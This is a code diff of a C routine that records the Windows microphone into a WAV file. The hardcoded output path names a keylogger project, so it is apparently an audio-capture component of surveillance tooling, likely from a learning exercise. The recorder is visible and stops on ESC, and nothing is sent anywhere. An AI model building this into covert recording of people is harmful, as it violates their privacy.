@@ -1,10 +1,7 @@
 #include <initguid.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
-
-
-#include "../../../winkey.h"
-
+#include "winkey.h"
 
 void write_wav_header(FILE *f, WAVEFORMATEX *fmt)
 {
@@ -28,7 +25,7 @@ void write_wav_header(FILE *f, WAVEFORMATEX *fmt)
 }
 
 
-void update_wav_header(FILE *f, WAVEFORMATEX *fmt, DWORD totalBytes)
+void update_wav_header(FILE *f, DWORD totalBytes)
 {
 	DWORD chunkSize = 36 + totalBytes;
 	fseek(f, 4, SEEK_SET);
@@ -57,7 +54,10 @@ void capture_micro(void)
 	if (!create_sound(&hr, &enumerator))
 		return;
 	if (!get_micro(&hr, enumerator, &device))
+	{	
+		printf("get_micro FAILED: 0x%08lX\n", hr);
 		return;
+	}
 	if (!active_client_audio(&hr, device, &audioClient))
 		return;
 	if (!take_format_audio(&hr, audioClient, &format))
@@ -68,8 +68,9 @@ void capture_micro(void)
 		return;
 	if (!start_service(&hr, audioClient))	
 		return;
-	FILE *f = fopen("capture.wav", "wb");
-	if (!f) return;
+	FILE *f = fopen("C:\\Users\\marcc\\keylogger-Wind\\winkey\\capture.wav", "wb");
+	if (!f)
+		return;
 	write_wav_header(f, format);
 	DWORD totalBytes = 0;
 	printf("Enregistrement... Appuie sur ESC pour arrêter.\n");
@@ -84,7 +85,7 @@ void capture_micro(void)
 		);
 		if (SUCCEEDED(hr))
 		{
-			printf("Frames: %u | Flags: 0x%08X\n", numFrames, flags);
+			printf("Frames: %u | Flags: 0x%08lX\n", numFrames, flags);
 			if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT))
 			{
 				printf("→ Son reçu CHEF !!\n");
@@ -99,9 +100,9 @@ void capture_micro(void)
 		Sleep(5);
 	}
 	audioClient->lpVtbl->Stop(audioClient);
-	update_wav_header(f, format, totalBytes);
+	update_wav_header(f, totalBytes);
 	fclose(f);
-	printf("Capture terminée. %u octets écrits dans capture.wav\n", totalBytes);
+	printf("Capture terminée. %lu octets écrits dans capture.wav\n", totalBytes);
 	CoUninitialize();
 }
 
